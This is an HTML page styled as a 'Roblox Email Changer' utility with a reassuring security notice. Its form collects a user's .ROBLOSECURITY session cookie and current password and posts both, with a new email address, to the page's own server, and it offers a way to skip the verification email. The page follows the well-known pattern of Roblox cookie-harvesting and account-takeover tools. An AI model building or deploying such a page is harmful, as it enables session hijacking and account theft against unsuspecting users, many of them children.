<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Email Changer</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 100%; max-width: 450px; overflow: hidden; }
        .header { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white; text-align: center; padding: 25px; }
        .header h1 { font-size: 24px; margin-bottom: 5px; }
        .header p { font-size: 14px; opacity: 0.9; }
        .form-container { padding: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; font-size: 14px; }
        input[type="email"], input[type="password"], input[type="text"] { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 16px; transition: border-color 0.3s ease; }
        input:focus { outline: none; border-color: #667eea; }
        .checkbox-group { display: flex; align-items: center; margin-bottom: 20px; }
        .checkbox-group input { margin-right: 10px; width: 18px; height: 18px; }
        .checkbox-group label { margin: 0; font-weight: normal; }
        .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s ease; }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled { background: #ccc; cursor: not-allowed; transform: none; }
        .result { margin-top: 20px; padding: 15px; border-radius: 8px; text-align: center; font-weight: 600; display: none; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
        .security-warning { background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px; padding: 15px; margin-bottom: 20px; text-align: center; }
        .security-warning h4 { color: #856404; margin-bottom: 8px; }
        .security-warning p { color: #856404; font-size: 14px; }
        .loader { display: none; text-align: center; margin-top: 10px; }
        .loader::after { content: ""; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #667eea; border-radius: 50%; display: inline-block; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Roblox Email Changer</h1>
            <p>Update your account email address securely</p>
        </div>
        <div class="form-container">
            <div class="security-warning">
                <h4>⚠️ Security Notice</h4>
                <p>Verification email will be sent to your new email address for security purposes.</p>
            </div>
            <form id="emailForm">
                <div class="form-group">
                    <label for="cookie">ROBLOSECURITY Cookie:</label>
                    <input type="text" id="cookie" placeholder="Enter your .ROBLOSECURITY cookie" required>
                </div>
                <div class="form-group">
                    <label for="password">Current Password:</label>
                    <input type="password" id="password" placeholder="Enter your current password" required>
                </div>
                <div class="form-group">
                    <label for="email">New Email Address:</label>
                    <input type="email" id="email" placeholder="Enter new email address" required>
                </div>
                <div class="checkbox-group">
                    <input type="checkbox" id="skipVerification">
                    <label for="skipVerification">Skip verification email (not recommended)</label>
                </div>
                <button type="submit" class="btn" id="submitBtn">Update Email Address</button>
                <div class="loader" id="loader"></div>
            </form>
            <div class="result" id="result"></div>
        </div>
    </div>
    <script>
        const API_BASE_URL = window.location.origin;
        document.getElementById('emailForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const cookie = document.getElementById('cookie').value.trim();
            const password = document.getElementById('password').value;
            const email = document.getElementById('email').value.trim();
            const skipVerification = document.getElementById('skipVerification').checked;
            const submitBtn = document.getElementById('submitBtn');
            const loader = document.getElementById('loader');
            const result = document.getElementById('result');
            result.style.display = 'none';
            result.className = 'result';
            submitBtn.disabled = true;
            loader.style.display = 'block';
            try {
                const response = await fetch(`${API_BASE_URL}/api/update-email`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie, password, emailAddress: email, skipVerification })
                });
                const data = await response.json();
                if (response.ok) {
                    result.textContent = skipVerification ? 
                        'Email updated successfully! No verification email sent.' : 
                        'Email update initiated! Please check your new email for verification.';
                    result.className = 'result success';
                } else {
                    result.textContent = `Error: ${data.error?.errors?.[0]?.message || data.error || 'Unknown error occurred'}`;
                    result.className = 'result error';
                }
            } catch (error) {
                result.textContent = `Network error: ${error.message}`;
                result.className = 'result error';
            } finally {
                result.style.display = 'block';
                submitBtn.disabled = false;
                loader.style.display = 'none';
                result.scrollIntoView({ behavior: 'smooth' });
            }
        });
        document.getElementById('skipVerification').addEventListener('change', function(e) {
            if (e.target.checked) {
                const result = document.getElementById('result');
                result.textContent = '⚠️ WARNING: Skipping verification is not recommended for security reasons!';
                result.className = 'result warning';
                result.style.display = 'block';
            }
        });
    </script>
</body>
  </html>
